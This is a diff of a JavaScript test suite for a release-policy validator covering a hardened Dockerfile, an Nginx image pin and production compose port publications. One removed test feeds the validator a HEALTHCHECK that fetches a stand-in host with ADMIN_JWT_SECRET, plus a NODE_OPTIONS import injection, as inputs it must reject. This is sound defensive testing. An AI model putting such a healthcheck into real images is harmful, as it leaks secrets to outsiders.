-        /docker\/Dockerfile\.security final ADD instructions are forbidden/u,
-      );
-    });
-  }
-});
-
-test('rejects an unmodeled RUN after runtime files were copied', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
+      await mutateDockerfile(root, (dockerfile) => dockerfile.replace(
         RUNTIME_CREDENTIAL_COPY,
-        `${RUNTIME_CREDENTIAL_COPY}\nRUN rm /app/src/lib/runtime-credentials.js`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /docker\/Dockerfile\.security: unmodeled RUN after runtime files were copied/u,
-    );
-  });
-});
-
-test('rejects an unmodeled final-stage RUN before runtime files are copied', async () => {
-  await withFixture(async (root) => {
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        STANDALONE_RUNTIME_COPY,
-        [
-          'RUN --mount=type=bind,from=builder,source=/app/src/lib,target=/tmp/lib cp -R /tmp/lib /app/src/lib',
-          STANDALONE_RUNTIME_COPY,
-        ].join('\n'),
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /docker\/Dockerfile\.security: unmodeled final-stage RUN instruction/u,
-    );
-  });
-});
-
-test('requires the exact final-stage hardening RUN after every COPY', async () => {
-  for (const mutate of [
-    (dockerfile) => dockerfile.replace(`${RUNTIME_HARDENING_RUN}\n`, ''),
-    (dockerfile) => dockerfile.replace(
-      `${ZOD_RUNTIME_COPY}\n${RUNTIME_HARDENING_RUN}`,
-      `${RUNTIME_HARDENING_RUN}\n${ZOD_RUNTIME_COPY}`,
-    ),
-    (dockerfile) => dockerfile.replace(
-      RUNTIME_HARDENING_RUN,
-      `${RUNTIME_HARDENING_RUN}\nCOPY --from=other /foreign/late.txt ./late.txt`,
-    ),
-  ]) {
-    await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
+        `${RUNTIME_CREDENTIAL_COPY}\n${instruction}`,
+      ));
       assertRejected(
         await validateReleasePolicy(root),
-        /docker\/Dockerfile\.security: final-stage runtime RUN contract is invalid/u,
+        /docker\/Dockerfile\.security: runner stage ADD instructions are forbidden/u,
       );
     });
   }
-});
-
-test('requires the exact non-root runtime user and startup entrypoint', async () => {
-  for (const [from, to, expected] of [
-    [RUNTIME_USER, 'USER root', /final runtime USER contract is invalid/u],
-    [
-      RUNTIME_ENTRYPOINT,
-      'ENTRYPOINT ["node", "server.js"]',
-      /final runtime ENTRYPOINT contract is invalid/u,
-    ],
-  ]) {
-    await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(dockerfilePath, dockerfile.replace(from, to), 'utf8');
-      assertRejected(await validateReleasePolicy(root), expected);
-    });
-  }
-});
-
-test('requires the exact single final-stage runtime environment', async () => {
-  for (const mutate of [
-    (dockerfile) => dockerfile.replace(`${RUNTIME_ENV}\n`, ''),
-    (dockerfile) => dockerfile.replace(
-      RUNTIME_ENV,
-      RUNTIME_ENV.replace('NODE_ENV=production', 'NODE_ENV=development'),
-    ),
-    (dockerfile) => dockerfile.replace(
-      RUNTIME_USER,
-      'ENV NODE_OPTIONS=--import=/app/server.js\nUSER 1001:1001',
-    ),
-  ]) {
-    await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
-      assertRejected(
-        await validateReleasePolicy(root),
-        /final runtime ENV contract is invalid/u,
-      );
-    });
-  }
-});
-
-test('requires the exact single safe runtime healthcheck', async () => {
-  for (const mutate of [
-    (dockerfile) => dockerfile.replace(`${RUNTIME_HEALTHCHECK}\n`, ''),
-    (dockerfile) => dockerfile.replace(RUNTIME_HEALTHCHECK, 'HEALTHCHECK NONE'),
-    (dockerfile) => dockerfile.replace(
-      RUNTIME_HEALTHCHECK,
-      'HEALTHCHECK CMD node -e "fetch(\'https://example.invalid/?s=\'+process.env.ADMIN_JWT_SECRET)"',
-    ),
-    (dockerfile) => dockerfile.replace(
-      RUNTIME_HEALTHCHECK,
-      `${RUNTIME_HEALTHCHECK}\n${RUNTIME_HEALTHCHECK}`,
-    ),
-  ]) {
-    await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
-      assertRejected(
-        await validateReleasePolicy(root),
-        /final runtime HEALTHCHECK contract is invalid/u,
-      );
-    });
-  }
-});
-
-test('rejects unmodeled final-image copies and shell overrides', async () => {
-  for (const instruction of [
-    'COPY --from=builder /app/unrelated.txt ./unrelated.txt',
-    'SHELL ["/bin/sh", "-c"]',
-  ]) {
-    await withFixture(async (root) => {
-      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-      const dockerfile = await readFile(dockerfilePath, 'utf8');
-      await writeFile(
-        dockerfilePath,
-        dockerfile.replace(RUNTIME_HARDENING_RUN, `${instruction}\n${RUNTIME_HARDENING_RUN}`),
-        'utf8',
-      );
-      assertRejected(
-        await validateReleasePolicy(root),
-        /unmodeled final-image COPY|final-stage SHELL instructions are forbidden/u,
-      );
-    });
-  }
-});
-
-test('rejects unreferenced manual module and package copies', async () => {
-  await withFixture(async (root) => {
-    await writeRelative(root, 'src/lib/unrelated.js', 'export const unrelated = true;\n');
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        RUNTIME_CREDENTIAL_COPY,
-        [
-          RUNTIME_CREDENTIAL_COPY,
-          'COPY --from=builder /app/src/lib/unrelated.js ./src/lib/unrelated.js',
-        ].join('\n'),
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /unreferenced manually copied runtime module: src\/lib\/unrelated\.js/u,
-    );
-  });
-
-  await withFixture(async (root) => {
-    await writeRelative(root, 'node_modules/unrelated/package.json', `${JSON.stringify({
-      name: 'unrelated',
-      version: '0.0.0',
-      type: 'module',
-      exports: './index.js',
-    }, null, 2)}\n`);
-    await writeRelative(
-      root,
-      'node_modules/unrelated/index.js',
-      'export const unrelated = true;\n',
-    );
-    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
-    const dockerfile = await readFile(dockerfilePath, 'utf8');
-    await writeFile(
-      dockerfilePath,
-      dockerfile.replace(
-        ZOD_RUNTIME_COPY,
-        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/unrelated ./node_modules/unrelated`,
-      ),
-      'utf8',
-    );
-    assertRejected(
-      await validateReleasePolicy(root),
-      /unreferenced runtime package copy: unrelated/u,
-    );
-  });
 });
 
 test('rejects reintroducing an obsolete runtime credential requirement', async () => {
@@ -1658,6 +768,17 @@ test('rejects missing private attestation overwrite', async () => {
   });
 });
 
+test('rejects the unmaintained Nginx 1.28.3 image', async () => {
+  await withFixture(async (root) => {
+    await writeRelative(root, 'deploy/nginx/image.lock.json', JSON.stringify({
+      repository: 'docker.io/library/nginx',
+      digest: 'sha256:a8b39bd9cf0f83869a2162827a0caf6137ddf759d50a171451b335cecc87d236',
+      mediaType: 'application/vnd.oci.image.index.v1+json',
+    }));
+    assertRejected(await validateReleasePolicy(root), /approved multi-platform digest-pinned official image/u);
+  });
+});
+
 test('rejects wildcard Nginx proxy trust', async () => {
   await withFixture(async (root) => {
     await writeRelative(root, 'deploy/nginx/includes/cloudflare-realip.conf', 'set_real_ip_from 0.0.0.0/0;\n');
@@ -1696,7 +817,67 @@ test('rejects public publication of the application port', async () => {
       '      - "3000:3000"',
       '',
     ].join('\n'));
-    assertRejected(await validateReleasePolicy(root), /application port must not be publicly published/u);
+    assertRejected(await validateReleasePolicy(root), /port "3000:3000" must not be publicly published/u);
+  });
+});
+
+async function writeProductionCompose(root, serviceLines) {
+  await writeRelative(root, 'docker/docker-compose.prod.yml', [
+    'services:',
+    '  db:',
+    `    image: ${APPROVED_IMAGE}`,
+    ...serviceLines,
+    '',
+  ].join('\n'));
+}
+
+for (const [label, serviceLines, pattern] of [
+  ['an interpolated host port without a host IP', ['  web:', '    ports:', '      - "${WEB_PORT:-3000}:3000"']],
+  ['an all-interfaces host IP', ['  web:', '    ports:', '      - "0.0.0.0:${WEB_PORT:-3000}:3000"']],
+  ['a different host port', ['  web:', '    ports:', '      - "8080:3000"']],
+  ['a bare container port', ['  web:', '    ports:', '      - "3000"']],
+  ['a long-syntax entry', ['  web:', '    ports:', '      - target: 3000', '        published: "8080"']],
+  ['a flow-sequence value', ['  web:', '    ports: ["8080:3000"]']],
+  ['a compact block sequence', ['  web:', '    ports:', '    - "8080:3000"']],
+  ['a database port', ['    ports:', '      - "5432:5432"']],
+  ['a flow-sequence value on the next line', [
+    '    ports:', '      - "127.0.0.1:${POSTGRES_PORT:-5432}:5432"',
+    '  web:', '    ports:', '      ["0.0.0.0:3000:3000"]',
+  ]],
+  ['an alias value on the next line', [
+    '  web:', '    x-p: &p', '      - "0.0.0.0:3000:3000"', '    ports:', '      *p',
+  ]],
+  ['a public entry between loopback entries', [
+    '  web:', '    ports:', '      - "127.0.0.1:${WEB_PORT:-3000}:3000"', '      - "0.0.0.0:8443:3000"',
+    '      - "[::1]:${WEB_PORT:-3000}:3000"',
+  ], /port "0\.0\.0\.0:8443:3000" must not be publicly published/u],
+]) {
+  test(`rejects a public production port publication: ${label}`, async () => {
+    await withFixture(async (root) => {
+      await writeProductionCompose(root, serviceLines);
+      assertRejected(
+        await validateReleasePolicy(root),
+        pattern ?? /docker-compose\.prod\.yml: port .+ must not be publicly published/u,
+      );
+    });
+  });
+}
+
+test('accepts loopback-only production port publications', async () => {
+  await withFixture(async (root) => {
+    await writeProductionCompose(root, [
+      '    ports:',
+      '      - "127.0.0.1:${POSTGRES_PORT:-5432}:5432"',
+      '    volumes:',
+      '      - postgres-prod-data:/var/lib/postgresql/data',
+      '  web:',
+      '    ports:',
+      '      - "127.0.0.1:${WEB_PORT:-3000}:3000"',
+      '      - "[::1]:${WEB_PORT:-3000}:3000"',
+      '    tmpfs:',
+      '      - /tmp',
+    ]);
+    assert.deepEqual(await validateReleasePolicy(root), []);
   });
 });
 
